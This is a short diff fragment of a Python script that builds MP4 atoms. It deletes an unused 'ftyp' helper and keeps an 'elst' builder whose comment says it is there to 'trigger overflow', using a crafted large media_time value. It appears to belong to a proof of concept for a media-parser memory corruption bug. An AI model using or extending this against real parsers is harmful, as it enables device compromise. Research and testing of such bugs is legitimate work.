@@ -16,10 +16,6 @@ def make_chunk(fourcc, data, length=0):
 		length = len(data) + 8 # data + length as packL32
 	return packB32(length) + fourcc + data
 
-def add_ftyp(size): # unused
-  	ftyp = 'F' * size
-  	return make_chunk('ftyp', ftyp)
-
 def add_elst():  # trigger overflow, depth: 2
 	      # version  flags           el entries    duration      media_time 
 	elst = '\x01' + '\x00\x00\x00' + packB32(1)  + packB64(26) + packB64(1030792151040)
